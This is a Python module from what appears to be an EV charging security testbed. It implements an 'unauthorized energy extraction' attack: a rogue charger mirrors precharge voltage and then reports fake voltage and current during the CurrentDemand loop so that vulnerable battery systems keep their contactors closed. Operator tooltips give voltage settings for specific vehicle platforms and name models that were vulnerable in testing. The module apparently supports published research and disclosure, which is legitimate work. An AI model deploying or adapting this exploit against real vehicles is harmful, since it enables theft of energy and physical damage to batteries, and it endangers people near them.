"""
Attack A2 — Unauthorized Energy Extraction via BMS state confusion.

Paper reference: `paper/4、Methodology.tex` §Attack 2;
HITCON ZeroDay ZD-2025-00560.

What it does
------------
Runs HotWire as an EVSE that:

1. Lets PreCharge succeed by **mirroring** the PEV's requested
   ``EVTargetVoltage`` in every ``PreChargeRes.EVSEPresentVoltage``.
   This uses the EVSE FSM's default precharge ramp (no override
   needed) — the ramp converges on whatever voltage the PEV asks
   for, and the PEV exits PreCharge cleanly. This is the
   "simulated ramping voltage" behaviour HITCON ZD-2025-00560
   describes as the attack mechanism.

2. Once PreCharge completes and the contactors close, the EVSE
   continues to LIE during the ``CurrentDemand`` loop: it announces
   ``EVSEPresentVoltage = self.voltage`` and ``EVSEPresentCurrent =
   self.current`` regardless of the real DC bus state. A vulnerable
   BMS that trusts the protocol assertion over its own physical
   sensors keeps the contactors closed and keeps sourcing current
   into whatever load the attacker has wired to the DC pins.

In a real attack the attacker's resistive load bank draws current
from the battery through the closed contactors. HotWire's
software-only role is to lie convincingly at the protocol level; the
hardware side (load bank, current sensing, safety interlocks) is out
of scope — see ``paper/5、Experimental Setup.tex`` and
:file:`../../SAFETY.md`.

Why no PreChargeRes override
----------------------------
Earlier versions of this attack also overrode ``PreChargeRes
.EVSEPresentVoltage`` to a static value (e.g. 380 V or whatever the
operator put into the GUI). That broke the attack against any PEV
whose ``EVTargetVoltage`` differed from the static value: the PEV
would request ``EVTargetVoltage = 220``, the EVSE would keep
responding with ``EVSEPresentVoltage = 380``, the two would never
match, and the session hung in ``WaitForPreChargeRes`` until the
spec timeout aborted everything. The fix is to let the EVSE's
default ramp mirror whatever the PEV asks for — that's what the
real-world attack does too — and only inject the lying value during
``CurrentDemand`` where it actually matters.

Tesla Model Y (tested in the paper) is NOT vulnerable because its
BMS independently measures DC voltage before closing contactors.
LUXGEN N7, CMC (unpublished), and Hyundai IONIQ 6 were all
vulnerable in testing.
"""
from __future__ import annotations

from dataclasses import dataclass, field

from ..core.modes import C_EVSE_MODE
from .base import Attack


# Hint strings surfaced as widget tooltips in the GUI attack-launcher.
# Operator guidance distilled from the paper §6 field tests + the
# HITCON ZD-2025-00560 disclosure: pick a value that any common EV's
# BMS will accept as "in range".
_VOLTAGE_HINT = (
    "Fake EVSEPresentVoltage announced in every CurrentDemandRes (V).\n"
    "Recommended: ≤ 95 % of the target's EVMaximumVoltageLimit.\n"
    "  • 400 V-platform EVs (LUXGEN N7, BYD Atto 3): 350–380 V\n"
    "  • 800 V-platform EVs (Hyundai IONIQ 6, Porsche Taycan): 700–760 V\n"
    "  • Universally-safe value (matches ZD-2025-00560 capture): 220 V\n"
    "Setting a value above the target's declared max may cause the BMS\n"
    "to reject the session before contactors close. Real-world attacker\n"
    "tools auto-derive this from PEV's ChargeParameterDiscoveryReq;\n"
    "HotWire keeps it operator-supplied as a testbed simplification."
)

_CURRENT_HINT = (
    "Fake EVSEPresentCurrent announced in every CurrentDemandRes (A).\n"
    "Real current is dictated by the attacker's physical load bank, not\n"
    "this protocol claim. Pick anything > 0 so the BMS doesn't decide\n"
    "charging stalled. Default 1 A is fine for proof-of-concept."
)


@dataclass
class ForcedDischarge(Attack):
    """Sustained-discharge override — lets PreCharge mirror the PEV's
    requested voltage (default ramp behaviour, no override) and lies
    about ``EVSEPresentVoltage`` + ``EVSEPresentCurrent`` throughout
    the ``CurrentDemand`` loop.

    Fields
    ------
    voltage
        The fake ``EVSEPresentVoltage`` we announce in every
        ``CurrentDemandRes`` (V) once the EV has exited PreCharge
        and closed its contactors. **Default 220 V** — matches the
        ZD-2025-00560 LUXGEN N7 capture in
        ``datasets/real_hw_traces/.../test2_a2_voltage`` and is low
        enough that virtually any production EV's BMS accepts it as
        "in range". Pick higher only when you know the target's
        ``EVMaximumVoltageLimit`` (e.g. 700 V for 800 V-platform EVs).
        See the GUI tooltip for ranges.

        Not used during PreCharge — the EVSE FSM's default ramp
        converges on the PEV's own ``EVTargetVoltage`` so PreCharge
        always succeeds regardless of what the operator picks here.
        (Setting ``voltage`` to something far from the PEV's target
        used to hang the session in ``WaitForPreChargeRes`` until
        spec timeout — see module docstring.)
    current
        The fake ``EVSEPresentCurrent`` we announce during the
        ``CurrentDemand`` loop (A). Default 1 A. Real current
        depends entirely on the attacker's physical load bank.

    Implementation note — testbed simplification
    --------------------------------------------
    A production-grade attacker tool would derive ``voltage``
    automatically from the PEV's declared ``EVMaximumVoltageLimit``
    in ``ChargeParameterDiscoveryReq`` (typically 90–95 % of it) so
    the same tool works against any car with no operator
    configuration. HITCON ZD-2025-00560's "simulated ramping
    voltage" wording implies that adaptive behaviour. HotWire keeps
    the voltage operator-supplied because (a) it makes the test
    suite deterministic, (b) the static-conservative pick (220 V)
    works against the same target classes the paper §6 field tests
    covered. Future work: a ``voltage="auto"`` mode that snoops
    ``ChargeParameterDiscoveryReq`` and substitutes the limit
    dynamically.
    """

    voltage: int = field(default=220, metadata={"hint": _VOLTAGE_HINT})
    current: int = field(default=1, metadata={"hint": _CURRENT_HINT})

    def __post_init__(self) -> None:
        if not 1 <= self.voltage <= 1000:
            raise ValueError(
                f"voltage must be 1..1000 V; got {self.voltage}"
            )
        if not 0 <= self.current <= 500:
            raise ValueError(
                f"current must be 0..500 A; got {self.current}"
            )
        self.name = "A2 — Unauthorized Energy Extraction"
        self.mode = C_EVSE_MODE
        self.description = (
            f"Let PreCharge succeed by mirroring the PEV's "
            f"EVTargetVoltage (default ramp). During the CurrentDemand "
            f"loop, announce EVSEPresentVoltage={self.voltage} V and "
            f"EVSEPresentCurrent={self.current} A regardless of the "
            f"real DC bus state. A vulnerable BMS that trusts protocol "
            f"state over physical sensors will keep its contactors "
            f"closed, exposing the battery to the attacker's load for "
            f"as long as the EV maintains the session."
        )
        self.overrides = {
            "CurrentDemandRes": {
                "EVSEPresentVoltage": self.voltage,
                "EVSEPresentCurrent": self.current,
            },
        }
